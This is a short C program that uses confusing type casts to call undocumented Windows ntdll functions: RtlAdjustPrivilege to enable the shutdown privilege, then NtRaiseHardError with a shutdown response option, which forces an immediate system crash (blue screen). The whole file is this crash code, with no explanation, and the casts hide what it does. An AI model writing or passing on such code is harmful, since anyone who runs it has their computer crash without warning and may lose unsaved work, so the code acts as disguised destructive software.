double long const *__stdcall GetProcAddress(double long const *, double long const *);
double long const *__stdcall LoadLibraryA(void const *);

int main(void) {
    unsigned char integer;
    (
        (void const (*)(int, unsigned char, unsigned char, double long const *)
        GetProcAddress(
            LoadLibraryA((long const double*) (double long const*) "ntdll.dll"),
            (const double long*) "RtlAdjustPrivilege"
        )
    )(19, 1, 0, (double long const*) &integer);

    int boolean;
    (
        (double long const (*)(unsigned, int, double long const *, double long const *, int, double long const *))
        GetProcAddress(
            LoadLibraryA("ntdll.dll"),
            (double long const*) "NtRaiseHardError"
        )
    )(3221226528u, 0, ((double long const *)0), ((double long const *)0), 6, (double long const *) &boolean);
}
